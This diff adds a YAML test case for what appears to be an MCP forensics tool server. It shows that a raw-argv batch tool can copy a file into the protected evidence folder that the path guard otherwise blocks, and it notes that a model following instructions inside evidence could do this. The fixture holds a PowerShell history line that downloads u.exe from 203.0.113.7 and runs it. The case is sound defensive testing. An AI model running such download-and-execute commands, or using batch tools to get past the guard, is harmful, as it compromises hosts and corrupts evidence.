@@ -1,0 +1,66 @@
+# Matrix case P1034-019: the output guard is the @output_safe decorator,
+# which checks only arguments named in core/paths.py _OUTPUT_PARAM_NAMES
+# (output_path, output_dir, ...). misc_batch_run takes raw argv lists
+# (tool_calls[].cmd) and runs them through core.executor.run with no path
+# check, so a `cp` whose target is inside the case's evidence folder runs and
+# writes there, while a typed tool given the same folder as output_path is
+# refused. README.md:292-293 says the guard runs before every subprocess call
+# that takes an output path.
+# The case folder sits under ${OUTSIDE}/cases (not under the runner's evidence
+# root, whose path already holds an "evidence" segment); its evidence/ folder
+# holds the host's PowerShell history, its exports/ folder a strings output.
+case_id: P1034-019
+problem: P1034
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: side-effect
+level: mcp
+realism: possible
+realism_ko: "`tool_calls[].cmd`는 모델 인자다. 도구 설명이 '이 파일들을 해시하라' 같은 저수준 묶음에 쓰라고 하므로 모델이 `cp`, `mv` 같은 명령을 넣는 일이 생기고, 대상 경로를 증거 폴더로 잘못 주거나 증거 속 지시문을 따르면 증거 폴더에 쓰게 된다."
+coverage: "partial: raw batch argv is shown; the mount_point arguments, also outside the guard, are P1034-020"
+coverage_ko: "raw batch argv만 보인다. 같은 검사 밖인 `mount_point` 계열 인자는 P1034-020에서 다룬다."
+summary: misc_batch_run(tool_calls=[{cmd:[cp, <exports file>, <case>/evidence/copy.txt]}]) returns success and the file appears in the case's evidence folder, while strings_extract with output_path in the same evidence folder is refused as a protected evidence directory.
+summary_ko: "`misc_batch_run`에 `cp <exports 파일> <사건>/evidence/copy.txt`를 주면 성공하고 사건의 증거 폴더에 파일이 생긴다. 같은 증거 폴더를 `output_path`로 준 `strings_extract`는 보호된 증거 폴더라며 거부된다."
+defect_ko: "이 서버는 쓰기 보호를 출력 인자 이름 목록에만 걸어, raw argv를 그대로 실행하는 `batch_run`으로는 증거 폴더에 파일을 쓸 수 있다. 출력 경로를 받는 모든 하위 프로세스 호출에 같은 보호를 걸거나 증거 폴더를 실제로 읽기 전용으로 두어야 한다. 모델과 분석가는 증거 폴더가 서버에서 늘 지켜진다고 알지만 증거 폴더에 다른 파일이 섞인다."
+setup_ko: "사건 폴더의 `evidence/`에 PowerShell 기록, `exports/`에 문자열 추출 결과를 두고 기록을 연 뒤, `batch_run`의 `cp`와 `strings_extract`의 `output_path`로 각각 증거 폴더에 쓰려고 한다."
+fixture:
+- path: cases/WKS-0412/analysis
+  root: outside
+  dir: true
+- path: cases/WKS-0412/evidence/ConsoleHost_history.txt
+  root: outside
+  text: "cd $env:TEMP\r\nInvoke-WebRequest -Uri http://203.0.113.7/u.exe -OutFile svchost32.exe\r\n.\\svchost32.exe -k netsvcs\r\nRemove-Item .\\svchost32.exe\r\n"
+- path: cases/WKS-0412/exports/ConsoleHost_history.strings.txt
+  root: outside
+  text: "Invoke-WebRequest -Uri http://203.0.113.7/u.exe -OutFile svchost32.exe\n.\\svchost32.exe -k netsvcs\n"
+steps:
+- tool: misc_start_execution_log
+  note_ko: "준비: 사건 기록을 연다"
+  args:
+    case_id: WKS-0412
+    output_path: ${OUTSIDE}/cases/WKS-0412/analysis/WKS-0412_trace.json
+    case_dir: ${OUTSIDE}/cases/WKS-0412
+    launch_dashboard: false
+- tool: misc_batch_run
+  note_ko: "결함 호출: 증거 폴더 안을 대상으로 하는 `cp`를 batch로 준다"
+  args:
+    tool_calls:
+    - cmd: [cp, "${OUTSIDE}/cases/WKS-0412/exports/ConsoleHost_history.strings.txt", "${OUTSIDE}/cases/WKS-0412/evidence/copy.txt"]
+- tool: strings_extract
+  note_ko: "비교 호출: 같은 증거 폴더를 `output_path`로 준다"
+  args:
+    file_path: ${OUTSIDE}/cases/WKS-0412/evidence/ConsoleHost_history.txt
+    min_length: 6
+    output_path: ${OUTSIDE}/cases/WKS-0412/evidence/strings.txt
+expect:
+- step: 2
+  note_ko: "증거 폴더로 복사하는 `cp`가 성공한다"
+  regex: '^\{"success": true, "results": \[\{"success": true, .*"cmd": "cp [^"]*/exports/ConsoleHost_history.strings.txt [^"]*/cases/WKS-0412/evidence/copy.txt"'
+- file_exists: ${OUTSIDE}/cases/WKS-0412/evidence/copy.txt
+  note_ko: 증거 폴더 안에 복사한 파일이 생긴다
+- step: 3
+  note_ko: 같은 폴더를 출력 인자로 준 도구는 보호된 증거 폴더라며 거부된다
+  contains: is inside a protected evidence directory
+- file_missing: ${OUTSIDE}/cases/WKS-0412/evidence/strings.txt
+  note_ko: 출력 인자로 준 경로에는 파일이 생기지 않는다
